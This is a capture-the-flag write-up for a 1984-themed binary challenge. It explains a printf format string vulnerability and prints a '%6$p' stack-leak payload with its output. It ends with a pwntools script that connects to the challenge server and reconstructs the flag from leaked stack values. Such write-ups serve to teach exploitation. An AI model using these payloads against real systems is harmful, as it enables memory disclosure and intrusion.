# pwn-2: flag-shredder

<img src="images/pwn-2.jpg"></img>

## Prompt 

The **Ministry of Truth** provides you the attached linux binary to exploit. It is also running on a remote server where it protects the truth in a file called flag.txt. Capture the flag from the remote server.  Big brother grants you the following code to connect to the remote server.

```python
from pwn import * 
p=remote("bigbrother-pwn-2.chals.io", 443, ssl=True, sni="bigbrother-pwn-2.chals.io")
p.interactive()
```


## Solution

The problem suffers a format string vulnerability, where the program passes user-defined input directly to printf() without a format specifier. We can take advantage of this vulnerability to leak the contents of the stack. 

We can request the 6th offset of the stack to be displayed as a pointer by sending ``%6$p``.

```
--------------------------------------------------------------------------------
So many thought criminal flags to shred, will you help >>>  

$ %6$p
<<< Response not understood. Thought police heard you say: 
0x61777b6674636262
```

Examining this by converting the hex to ascii and reversing the byte order, we see this is the beginning of the flag.

```
 unhex 61777b6674636262 | rev
bbctf{wa
```

We can then automate the process using a [pwntools](https://docs.pwntools.com/en/stable/) script to bring back the remaining 16 bytes of the flag. 

```python
from pwn import *
from binascii import unhexlify

p=remote("bigbrother-pwn-2.chals.io", 443, ssl=True, sni="bigbrother-pwn-2.chals.io")
p.sendlineafter(b' >>>', b'%6$p.%7$p.%8$p')

p.recvuntil(b'heard you say:')
p.recvline()

leak = p.recvline().replace(b'0x',b'').strip(b'\n').split(b'.')

flag = (unhexlify(leak[0])[::-1])
flag += (unhexlify(leak[1])[::-1])
flag += (unhexlify(leak[2])[::-1])[0:3]

print("Flag: %s" %flag)

```
